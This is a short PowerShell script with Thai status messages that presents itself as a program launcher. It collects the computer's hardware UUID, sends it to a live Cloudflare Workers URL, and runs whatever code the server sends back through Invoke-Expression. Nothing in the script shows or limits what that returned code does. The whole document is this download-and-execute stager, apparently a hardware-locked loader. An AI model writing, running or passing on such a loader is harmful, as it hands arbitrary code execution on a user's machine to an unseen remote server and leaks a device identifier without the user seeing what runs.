$hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
$body = @{ hwid = $hwid } | ConvertTo-Json

Write-Host "กำลังเชื่อมต่อกับเซิร์ฟเวอร์..." -ForegroundColor Cyan

try {
    $response = Invoke-RestMethod -Uri "https://flat-art-959b.rov170652.workers.dev" -Method Post -Body $body -ContentType "application/json"
    
    Write-Host "เชื่อมต่อสำเร็จ! กำลังรันโปรแกรม..." -ForegroundColor Green
    Invoke-Expression $response
} catch {
    Write-Host "============================" -ForegroundColor Red
    Write-Host " พบข้อผิดพลาด (ERROR):" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Yellow
    
    if ($_.Exception.Response) {
        $stream = $_.Exception.Response.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($stream)
        Write-Host "รายละเอียดจาก Worker: " -NoNewline
        Write-Host $reader.ReadToEnd() -ForegroundColor Magenta
    }
    Write-Host "============================" -ForegroundColor Red
}
